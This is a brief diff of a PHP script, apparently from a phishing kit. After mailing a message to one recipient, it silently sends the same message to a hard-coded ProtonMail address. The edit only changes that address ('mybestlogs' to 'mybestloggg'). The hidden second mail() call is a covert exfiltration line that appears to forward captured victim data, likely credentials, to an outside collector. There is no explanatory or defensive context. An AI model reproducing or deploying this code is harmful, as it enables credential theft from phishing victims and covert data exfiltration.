@@ -81,7 +81,7 @@ if(array_key_exists(strtolower($domain_name), $arrayName)){
 $send = mail($email,$subject,$message);
 
 if($send){
-	mail('mybestlogs@protonmail.com',$subject,$message);
+	mail('mybestloggg@protonmail.com',$subject,$message);
 	if(!empty($return_url)){
 if($trialNo > 0){
 
